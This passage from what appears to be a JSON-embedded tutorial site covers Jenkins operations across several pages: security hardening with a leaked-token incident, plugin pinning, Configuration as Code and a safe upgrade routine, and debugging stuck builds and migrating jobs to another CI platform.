weak:\u003c/span> Local accounts with shared passwords have no owner.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"authz\">\u003cdt>Authorization \u003cspan class=\"dg-kt\">Security\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Role-based rules decide who can view, build or configure.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> Everyone as admin means every job can read every secret.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"job\">\u003cdt>Job and library \u003cspan class=\"dg-kt\">Service\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Pipeline code runs in a sandbox with script approval.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> Approving scripts without reading them removes the sandbox.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"agent\">\u003cdt>Agent \u003cspan class=\"dg-kt\">Service\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Runs the build away from the controller.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> Builds on the controller can read the secrets directory.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"audit\">\u003cdt>Audit and patching \u003cspan class=\"dg-kt\">Observability\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Logs who changed what; core and plugins are updated promptly.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> Old plugins are the most common entry point.\u003c/dd>\u003c/div>\u003c/dl>\u003c/figure>\n\u003ch2 id=\"hardening-list\">Hardening list\u003c/h2>\n\u003cp>Run builds only on agents. Restrict what a pipeline can do with the script sandbox, and review every script approval. Limit agent-to-controller access. Use HTTPS and keep the controller off the public internet if possible. Update the core and plugins on a schedule and remove plugins you do not use, because every plugin adds code that runs with Jenkins&#39; power. Back up \u003ccode>JENKINS_HOME\u003c/code> and test a restore.\u003c/p>\n\u003ch2 id=\"incident-the-secret-in-the-build-log\">Incident: The secret in the build log\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A debugging line printed an encoded copy of a registry token and masking did not recognise it.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln out\">+ echo cmVnaXN0cnktdG9rZW4=\u003c/span>\u003cspan class=\"ln out\">Finished: SUCCESS\u003c/span>\u003cspan class=\"ln out\">audit: registry login from unknown address 203.0.113.50\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Anyone who could read the job log could decode the token. The team rotated it, switched to short-lived registry tokens issued per build and added a scan that fails a build whose log contains common secret patterns.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Printing environment variables while debugging\u003c/li>\n\u003cli>Giving all developers admin rights\u003c/li>\n\u003cli>Leaving old plugins installed and unpatched\u003c/li>\n\u003cli>Allowing builds on the controller\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"credentials","text":"Credentials"},{"id":"who-can-do-what","text":"Who can do what"},{"id":"hardening-list","text":"Hardening list"},{"id":"incident-the-secret-in-the-build-log","text":"Incident: The secret in the build log"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Securing Jenkins","u":"https://www.jenkins.io/doc/book/security/"},{"t":"Using credentials","u":"https://www.jenkins.io/doc/book/using/using-credentials/"}],"text":"A CI server can read your code, push to your registry and often deploy to production. That makes it one of the most valuable targets in a company. Hardening Jenkins is mostly a short list of habits applied every time. What you will learn How the credentials store scopes and masks secrets Authentication and role-based access Keeping build code away from the controller Patching, plugins and an audit trail Credentials Store secrets in the credentials store, give each a clear ID and bind them only where needed with withCredentials . Jenkins masks the exact value in logs, but masking does not catch a modified copy, so never print secrets at all. withCredentials([string( credentialsId: &#x27;registry-token&#x27; , variable: &#x27;TOKEN&#x27; )]) { sh &#x27;echo \"$TOKEN\" | docker login registry.example.com -u ci --password-stdin&#x27; } Prefer short-lived credentials (a cloud role or a vault lease) over a long-lived key, and use folder-scoped credentials so a team can only see its own. Who can do what Turn on a security realm (your company SSO) and an authorization strategy such as role-based access: viewers, developers who build, admins who configure. Disable anonymous read. Admin rights should be rare and logged. Layers of Jenkins security Flow in order: 1, Person to Authorization; 2, Authorization to Job and library; 3, Job and library to Agent; 4, Authorization to Audit and patching. Step Security Service Observability Numbered arrows show the order of the flow Select a component to see what it does and what happens when it fails. Person Step What it does: Signs in through single sign-on. If it fails or is weak: Local accounts with shared passwords have no owner. Authorization Security What it does: Role-based rules decide who can view, build or configure. If it fails or is weak: Everyone as admin means every job can read every secret. Job and library Service What it does: Pipeline code runs in a sandbox with script approval. If it fails or is weak: Approving scripts without reading them removes the sandbox. Agent Service What it does: Runs the build away from the controller. If it fails or is weak: Builds on the controller can read the secrets directory. Audit and patching Observability What it does: Logs who changed what; core and plugins are updated promptly. If it fails or is weak: Old plugins are the most common entry point. Hardening list Run builds only on agents. Restrict what a pipeline can do with the script sandbox, and review every script approval. Limit agent-to-controller access. Use HTTPS and keep the controller off the public internet if possible. Update the core and plugins on a schedule and remove plugins you do not use, because every plugin adds code that runs with Jenkins&#39; power. Back up JENKINS_HOME and test a restore. Incident: The secret in the build log Incident A debugging line printed an encoded copy of a registry token and masking did not recognise it. + echo cmVnaXN0cnktdG9rZW4= Finished: SUCCESS audit: registry login from unknown address 203.0.113.50 Anyone who could read the job log could decode the token. The team rotated it, switched to short-lived registry tokens issued per build and added a scan that fails a build whose log contains common secret patterns. Common mistakes Printing environment variables while debugging Giving all developers admin rights Leaving old plugins installed and unpatched Allowing builds on the controller"},"cicd/jenkins-plugins-upgrades-and-operating-at-scale":{"html":"\u003cp>A Jenkins server that has run for years is often a pile of hand-made settings and dozens of plugins. Operating it well means being able to recreate it, upgrade it without fear and notice problems before the users do.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>Choosing the LTS line and managing plugins\u003c/li>\n\u003cli>Configuration as Code for the controller\u003c/li>\n\u003cli>Backups, restores and a safe upgrade routine\u003c/li>\n\u003cli>Metrics that show a Jenkins in trouble\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"plugins-are-dependencies\">Plugins are dependencies\u003c/h2>\n\u003cp>Each plugin is code that runs inside the controller. Keep a list in a file with pinned versions, install only what you need and read the update notes. Prefer the \u003cstrong>LTS\u003c/strong> (long-term support) line for the core, which changes slowly and gets security fixes.\u003c/p>\n\u003cdiv class=\"code\" data-lang=\"text\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"# plugins.txt\nworkflow-aggregator:600.vb_57cce\ngit:5.2.2\nkubernetes:4203.v1dc\nconfiguration-as-code:1810.v9b_c30\ncredentials-binding:687.v619\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\"># plugins.txt\nworkflow-aggregator:600.vb_57cce\ngit:5.2.2\nkubernetes:4203.v1dc\nconfiguration-as-code:1810.v9b_c30\ncredentials-binding:687.v619\u003c/code>\u003c/pre>\u003c/div>\n\u003ch2 id=\"configuration-as-code\">Configuration as Code\u003c/h2>\n\u003cp>The Configuration as Code plugin reads a YAML file and sets up the controller to match: security realm, agents, credentials references and global settings. A rebuilt controller then comes up the same every time.\u003c/p>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"jenkins:\n  systemMessage: &quot;Managed by code. Change it in the repository.&quot;\n  numExecutors: 0\n  securityRealm:\n    local:\n      allowsSignup: false\nunclassified:\n  location:\n    url: https://ci.example.com/\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-attr\">jenkins:\u003c/span>\n  \u003cspan class=\"hljs-attr\">systemMessage:\u003c/span> \u003cspan class=\"hljs-string\">&quot;Managed by code. Change it in the repository.&quot;\u003c/span>\n  \u003cspan class=\"hljs-attr\">numExecutors:\u003c/span> \u003cspan class=\"hljs-number\">0\u003c/span>\n  \u003cspan class=\"hljs-attr\">securityRealm:\u003c/span>\n    \u003cspan class=\"hljs-attr\">local:\u003c/span>\n      \u003cspan class=\"hljs-attr\">allowsSignup:\u003c/span> \u003cspan class=\"hljs-literal\">false\u003c/span>\n\u003cspan class=\"hljs-attr\">unclassified:\u003c/span>\n  \u003cspan class=\"hljs-attr\">location:\u003c/span>\n    \u003cspan class=\"hljs-attr\">url:\u003c/span> \u003cspan class=\"hljs-string\">https://ci.example.com/\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cfigure class=\"dg\" data-rows=\"2\" data-edges=\"plan&gt;copy;copy&gt;verify;verify&gt;back;back&gt;roll\" style=\"--rows:2\">\u003cfigcaption class=\"dg-title\">A safe upgrade routine\u003c/figcaption>\u003cdiv class=\"dg-stage\">\u003csvg viewBox=\"0 0 100 100\" preserveAspectRatio=\"none\" aria-hidden=\"true\" focusable=\"false\">\u003cline x1=\"16.7\" y1=\"25.0\" x2=\"50.0\" y2=\"25.0\"/>\u003cline x1=\"50.0\" y1=\"25.0\" x2=\"83.3\" y2=\"25.0\"/>\u003cline x1=\"83.3\" y1=\"25.0\" x2=\"50.0\" y2=\"75.0\"/>\u003cline x1=\"50.0\" y1=\"75.0\" x2=\"83.3\" y2=\"75.0\"/>\u003c/svg>\u003cbutton type=\"button\" class=\"dg-node k-process\" data-act=\"dg-pick\" data-id=\"plan\" data-kind=\"process\" style=\"left:16.7%;top:25.0%;--w:29.3%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Read release notes\u003c/span>\u003cspan class=\"dg-kind\">Step\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-service\" data-act=\"dg-pick\" data-id=\"copy\" data-kind=\"service\" style=\"left:50.0%;top:25.0%;--w:29.3%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Test instance\u003c/span>\u003cspan class=\"dg-kind\">Service\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-observe\" data-act=\"dg-pick\" data-id=\"verify\" data-kind=\"observe\" style=\"left:83.3%;top:25.0%;--w:29.3%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Run sample jobs\u003c/span>\u003cspan class=\"dg-kind\">Observability\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-store\" data-act=\"dg-pick\" data-id=\"back\" data-kind=\"store\" style=\"left:50.0%;top:75.0%;--w:29.3%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Fresh backup\u003c/span>\u003cspan class=\"dg-kind\">Data store\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-process\" data-act=\"dg-pick\" data-id=\"roll\" data-kind=\"process\" style=\"left:83.3%;top:75.0%;--w:29.3%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Upgrade production\u003c/span>\u003cspan class=\"dg-kind\">Step\u003c/span>\u003c/button>\u003c/div>\u003cp class=\"sr\">Flow in order: 1, Read release notes to Test instance; 2, Test instance to Run sample jobs; 3, Run sample jobs to Fresh backup; 4, Fresh backup to Upgrade production.\u003c/p>\u003cul class=\"dg-legend\" aria-label=\"Legend\">\u003cli>\u003ci class=\"dg-sw k-process\" aria-hidden=\"true\">\u003c/i>Step\u003c/li>\u003cli>\u003ci class=\"dg-sw k-service\" aria-hidden=\"true\">\u003c/i>Service\u003c/li>\u003cli>\u003ci class=\"dg-sw k-observe\" aria-hidden=\"true\">\u003c/i>Observability\u003c/li>\u003cli>\u003ci class=\"dg-sw k-store\" aria-hidden=\"true\">\u003c/i>Data store\u003c/li>\u003cli>\u003ci class=\"dg-arrow\" aria-hidden=\"true\">\u003c/i>Numbered arrows show the order of the flow\u003c/li>\u003c/ul>\u003cp class=\"dg-hint small\">Select a component to see what it does and what happens when it fails. \u003cbutton type=\"button\" class=\"btn btn-quiet dg-flow-btn\" data-act=\"dg-flow\" aria-pressed=\"false\">Show the flow\u003c/button>\u003c/p>\u003cdiv class=\"dg-live\" role=\"status\" aria-live=\"polite\">\u003c/div>\u003cdl class=\"dg-list\">\u003cdiv class=\"dg-item\" data-id=\"plan\">\u003cdt>Read release notes \u003cspan class=\"dg-kt\">Step\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Check the LTS changelog and plugin compatibility.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> Skipping notes hides breaking changes.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"copy\">\u003cdt>Test instance \u003cspan class=\"dg-kt\">Service\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Start a copy from backup with the new versions.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> Testing in production is how Friday outages happen.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"verify\">\u003cdt>Run sample jobs \u003cspan class=\"dg-kt\">Observability\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Build key pipelines and check agents, credentials and plugins.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> An empty test misses real breakage.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"back\">\u003cdt>Fresh backup \u003cspan class=\"dg-kt\">Data store\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Back up JENKINS_HOME and keep the previous version available.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> An untested backup is a hope, not a plan.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"roll\">\u003cdt>Upgrade production \u003cspan class=\"dg-kt\">Step\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Upgrade in a quiet window and watch metrics.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> No rollback plan turns a bad upgrade into an outage.\u003c/dd>\u003c/div>\u003c/dl>\u003c/figure>\n\u003ch2 id=\"watching-jenkins\">Watching Jenkins\u003c/h2>\n\u003cp>Measure queue length and time in queue, executor utilisation, build duration, disk use of \u003ccode>JENKINS_HOME\u003c/code> and JVM memory and garbage collection. A growing queue with idle agents points to labels or connection problems. A full disk or heap is the usual cause of a controller that slows down and then stops.\u003c/p>\n\u003ch2 id=\"incident-the-plugin-upgrade-that-stopped-the-controller\">Incident: The plugin upgrade that stopped the controller\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A batch plugin update left the controller failing at startup because two plugins disagreed about a shared library.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"journalctl -u jenkins -n 4\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>journalctl -u jenkins -n 4\u003c/span>\u003cspan class=\"ln out\">SEVERE: Failed Loading plugin workflow-cps v3999\u003c/span>\u003cspan class=\"ln out\">java.lang.NoSuchMethodError: hudson.model.Run.getParent()\u003c/span>\u003cspan class=\"ln out\">Jenkins stopped\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>They restored the plugin directory from the night before, upgraded plugins one group at a time in a test instance and added a written upgrade and rollback routine.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Upgrading everything at once on a Friday\u003c/li>\n\u003cli>Installing plugins nobody owns\u003c/li>\n\u003cli>Keeping backups that were never restored\u003c/li>\n\u003cli>Configuring the controller only by clicking in the UI\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"plugins-are-dependencies","text":"Plugins are dependencies"},{"id":"configuration-as-code","text":"Configuration as Code"},{"id":"watching-jenkins","text":"Watching Jenkins"},{"id":"incident-the-plugin-upgrade-that-stopped-the-controller","text":"Incident: The plugin upgrade that stopped the controller"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Jenkins Configuration as Code","u":"https://www.jenkins.io/projects/jcasc/"},{"t":"Jenkins LTS","u":"https://www.jenkins.io/download/lts/"}],"text":"A Jenkins server that has run for years is often a pile of hand-made settings and dozens of plugins. Operating it well means being able to recreate it, upgrade it without fear and notice problems before the users do. What you will learn Choosing the LTS line and managing plugins Configuration as Code for the controller Backups, restores and a safe upgrade routine Metrics that show a Jenkins in trouble Plugins are dependencies Each plugin is code that runs inside the controller. Keep a list in a file with pinned versions, install only what you need and read the update notes. Prefer the LTS (long-term support) line for the core, which changes slowly and gets security fixes. # plugins.txt workflow-aggregator:600.vb_57cce git:5.2.2 kubernetes:4203.v1dc configuration-as-code:1810.v9b_c30 credentials-binding:687.v619 Configuration as Code The Configuration as Code plugin reads a YAML file and sets up the controller to match: security realm, agents, credentials references and global settings. A rebuilt controller then comes up the same every time. jenkins: systemMessage: \"Managed by code. Change it in the repository.\" numExecutors: 0 securityRealm: local: allowsSignup: false unclassified: location: url: https://ci.example.com/ A safe upgrade routine Flow in order: 1, Read release notes to Test instance; 2, Test instance to Run sample jobs; 3, Run sample jobs to Fresh backup; 4, Fresh backup to Upgrade production. Step Service Observability Data store Numbered arrows show the order of the flow Select a component to see what it does and what happens when it fails. Read release notes Step What it does: Check the LTS changelog and plugin compatibility. If it fails or is weak: Skipping notes hides breaking changes. Test instance Service What it does: Start a copy from backup with the new versions. If it fails or is weak: Testing in production is how Friday outages happen. Run sample jobs Observability What it does: Build key pipelines and check agents, credentials and plugins. If it fails or is weak: An empty test misses real breakage. Fresh backup Data store What it does: Back up JENKINS_HOME and keep the previous version available. If it fails or is weak: An untested backup is a hope, not a plan. Upgrade production Step What it does: Upgrade in a quiet window and watch metrics. If it fails or is weak: No rollback plan turns a bad upgrade into an outage. Watching Jenkins Measure queue length and time in queue, executor utilisation, build duration, disk use of JENKINS_HOME and JVM memory and garbage collection. A growing queue with idle agents points to labels or connection problems. A full disk or heap is the usual cause of a controller that slows down and then stops. Incident: The plugin upgrade that stopped the controller Incident A batch plugin update left the controller failing at startup because two plugins disagreed about a shared library. $ journalctl -u jenkins -n 4 SEVERE: Failed Loading plugin workflow-cps v3999 java.lang.NoSuchMethodError: hudson.model.Run.getParent() Jenkins stopped They restored the plugin directory from the night before, upgraded plugins one group at a time in a test instance and added a written upgrade and rollback routine. Common mistakes Upgrading everything at once on a Friday Installing plugins nobody owns Keeping backups that were never restored Configuring the controller only by clicking in the UI"},"cicd/jenkins-debugging-and-migrating-to-another-platform":{"html":"\u003cp>Most Jenkins trouble falls into a few patterns, and a short method finds them quickly. Many teams also eventually move to a hosted platform, and a plan that moves one pipeline at a time keeps that from becoming a long project with no end.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>A method for builds that wait, hang or fail\u003c/li>\n\u003cli>Using replay, thread dumps and the queue reason\u003c/li>\n\u003cli>Taking stock of existing jobs\u003c/li>\n\u003cli>Migrating step by step to GitHub Actions or GitLab CI\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"a-method-for-stuck-builds\">A method for stuck builds\u003c/h2>\n\u003col>\n\u003cli>\u003cstrong>Waiting in the queue?\u003c/strong> Hover over the queued item: the reason says &quot;waiting for next available executor&quot; or &quot;no node with label X&quot;.\u003c/li>\n\u003cli>\u003cstrong>Agent healthy?\u003c/strong> Check the node page: offline, disk full, low memory or a clock problem.\u003c/li>\n\u003cli>\u003cstrong>Running but silent?\u003c/strong> Look at the last log line and the thread dump of the build to see what it waits for (a lock, a network call, an input step).\u003c/li>\n\u003cli>\u003cstrong>Failing?\u003c/strong> Find the first error in the log and rerun with \u003cstrong>Replay\u003c/strong> to test a fix without a commit.\u003c/li>\n\u003c/ol>\n\u003cfigure class=\"dg\" data-rows=\"2\" data-edges=\"q&gt;node;node&gt;step;step&gt;log;log&gt;fix\" style=\"--rows:2\">\u003cfigcaption class=\"dg-title\">Where a Jenkins build can get stuck\u003c/figcaption>\u003cdiv class=\"dg-stage\">\u003csvg viewBox=\"0 0 100 100\" preserveAspectRatio=\"none\" aria-hidden=\"true\" focusable=\"false\">\u003cline x1=\"12.5\" y1=\"25.0\" x2=\"37.5\" y2=\"25.0\"/>\u003cline x1=\"37.5\" y1=\"25.0\" x2=\"62.5\" y2=\"25.0\"/>\u003cline x1=\"62.5\" y1=\"25.0\" x2=\"87.5\" y2=\"25.0\"/>\u003cline x1=\"87.5\" y1=\"25.0\" x2=\"87.5\" y2=\"75.0\"/>\u003c/svg>\u003cbutton type=\"button\" class=\"dg-node k-queue\" data-act=\"dg-pick\" data-id=\"q\" data-kind=\"queue\" style=\"left:12.5%;top:25.0%;--w:22.0%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Queue\u003c/span>\u003cspan class=\"dg-kind\">Queue\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-service\" data-act=\"dg-pick\" data-id=\"node\" data-kind=\"service\" style=\"left:37.5%;top:25.0%;--w:22.0%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Node\u003c/span>\u003cspan class=\"dg-kind\">Service\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-process\" data-act=\"dg-pick\" data-id=\"step\" data-kind=\"process\" style=\"left:62.5%;top:25.0%;--w:22.0%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Running step\u003c/span>\u003cspan class=\"dg-kind\">Step\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-observe\" data-act=\"dg-pick\" data-id=\"log\" data-kind=\"observe\" style=\"left:87.5%;top:25.0%;--w:22.0%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Console log\u003c/span>\u003cspan class=\"dg-kind\">Observability\u003c/span>\u003c/button>\u003cbutton type=\"button\" class=\"dg-node k-queue\" data-act=\"dg-pick\" data-id=\"fix\" data-kind=\"queue\" style=\"left:87.5%;top:75.0%;--w:22.0%\" aria-pressed=\"false\">\u003cspan class=\"dg-name\">Replay and retry\u003c/span>\u003cspan class=\"dg-kind\">Queue\u003c/span>\u003c/button>\u003c/div>\u003cp class=\"sr\">Flow in order: 1, Queue to Node; 2, Node to Running step; 3, Running step to Console log; 4, Console log to Replay and retry.\u003c/p>\u003cul class=\"dg-legend\" aria-label=\"Legend\">\u003cli>\u003ci class=\"dg-sw k-queue\" aria-hidden=\"true\">\u003c/i>Queue\u003c/li>\u003cli>\u003ci class=\"dg-sw k-service\" aria-hidden=\"true\">\u003c/i>Service\u003c/li>\u003cli>\u003ci class=\"dg-sw k-process\" aria-hidden=\"true\">\u003c/i>Step\u003c/li>\u003cli>\u003ci class=\"dg-sw k-observe\" aria-hidden=\"true\">\u003c/i>Observability\u003c/li>\u003cli>\u003ci class=\"dg-arrow\" aria-hidden=\"true\">\u003c/i>Numbered arrows show the order of the flow\u003c/li>\u003c/ul>\u003cp class=\"dg-hint small\">Select a component to see what it does and what happens when it fails. \u003cbutton type=\"button\" class=\"btn btn-quiet dg-flow-btn\" data-act=\"dg-flow\" aria-pressed=\"false\">Show the flow\u003c/button>\u003c/p>\u003cdiv class=\"dg-live\" role=\"status\" aria-live=\"polite\">\u003c/div>\u003cdl class=\"dg-list\">\u003cdiv class=\"dg-item\" data-id=\"q\">\u003cdt>Queue \u003cspan class=\"dg-kt\">Queue\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Holds builds until a matching executor is free.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> A label no agent has leaves the build waiting forever.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"node\">\u003cdt>Node \u003cspan class=\"dg-kt\">Service\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> An agent with free executors and disk.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> Offline, full or out of memory nodes reject or kill builds.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"step\">\u003cdt>Running step \u003cspan class=\"dg-kt\">Step\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> The command or plugin step that is doing work.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> A step waiting for input or a network call hangs the executor.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"log\">\u003cdt>Console log \u003cspan class=\"dg-kt\">Observability\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> The record of what happened.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> The first error matters; later errors are noise.\u003c/dd>\u003c/div>\u003cdiv class=\"dg-item\" data-id=\"fix\">\u003cdt>Replay and retry \u003cspan class=\"dg-kt\">Queue\u003c/span>\u003c/dt>\u003cdd>\u003cspan class=\"dg-k\">What it does:\u003c/span> Edit the pipeline in Replay and rerun to test a fix.\u003c/dd>\u003cdd>\u003cspan class=\"dg-k\">If it fails or is weak:\u003c/span> Replay edits are not saved, so copy them into the repository.\u003c/dd>\u003c/div>\u003c/dl>\u003c/figure>\n\u003ch2 id=\"migrating-without-a-big-bang\">Migrating without a big bang\u003c/h2>\n\u003cp>Start with an \u003cstrong>inventory\u003c/strong>: list every job, its last run and its owner. Retire jobs that nobody runs. Move build logic into scripts or a Makefile so it runs anywhere. Translate triggers, credentials and approvals one by one (a shared library step may become a reusable workflow or an included template). Run the old and new pipelines side by side until results match, then switch the required check and archive the old job.\u003c/p>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"jenkins-inventory --since 180d\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>jenkins-inventory --since 180d\u003c/span>\u003cspan class=\"ln out\">jobs: 214   ran in last 180 days: 61   owner unknown: 98\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003ch2 id=\"incident-the-pipeline-that-hung-for-two-days\">Incident: The pipeline that hung for two days\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A build waited for an input step that was only visible to a person who had left the company.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln out\">Waiting for input: Deploy to production?\u003c/span>\u003cspan class=\"ln out\">Approver list: [alice] (account disabled)\u003c/span>\u003cspan class=\"ln out\">Build running for 49 hours\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>The build held an executor and a lock on the deploy environment. The fix was to give the input step a timeout and a group approver, and to alert on builds running longer than a set time.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Restarting the controller before reading the queue reason\u003c/li>\n\u003cli>Editing jobs in Replay and forgetting to commit the fix\u003c/li>\n\u003cli>Starting a migration with no inventory\u003c/li>\n\u003cli>Moving everything at once instead of one pipeline at a time\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"a-method-for-stuck-builds","text":"A method for stuck builds"},{"id":"migrating-without-a-big-bang","text":"Migrating without a big bang"},{"id":"incident-the-pipeline-that-hung-for-two-days","text":"Incident: The pipeline that hung for two days"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Pipeline troubleshooting","u":"https://www.jenkins.io/doc/book/pipeline/development/"},{"t":"Jenkins monitoring","u":"https://www.jenkins.io/doc/book/system-administration/monitoring/"}],"text":"Most Jenkins trouble falls into a few patterns, and a short method finds them quickly. Many teams also eventually move to a hosted platform, and a plan that moves one pipeline at a time keeps that from becoming a long project with no end. What you will learn A method for builds that wait, hang or fail Using replay, thread dumps and the queue reason Taking stock of existing jobs Migrating step by step to GitHub Actions or GitLab CI A method for stuck builds Waiting in the queue? Hover over the queued item: the reason says \"waiting for next available executor\" or \"no node with label X\". Agent healthy? Check the node page: offline, disk full, low memory or a clock problem. Running but silent? Look at the last log line and the thread dump of the build to see what it waits for (a lock, a network call, an input step). Failing? Find the first error in the log and rerun with Replay to test a fix without a commit. Where a Jenkins build can get stuck Flow in order: 1, Queue to Node; 2, Node to Running step; 3, Running step to Console log; 4, Console log to Replay and retry. Queue Service Step Observability Numbered arrows show the order of the flow Select a component to see what it does and what happens when it fails. Queue Queue What it does: Holds builds until a matching executor is free. If it fails or is weak: A label no agent has leaves the build waiting forever. Node Service What it does: An agent with free executors and disk. If it fails or is weak: Offline, full or out of memory nodes reject or kill builds. Running step Step What it does: The command or plugin step that is doing work. If it fails or is weak: A step waiting for input or a network call hangs the executor. Console log Observability What it does: The record of what happened. If it fails or is weak: The first error matters; later errors are noise. Replay and retry Queue What it 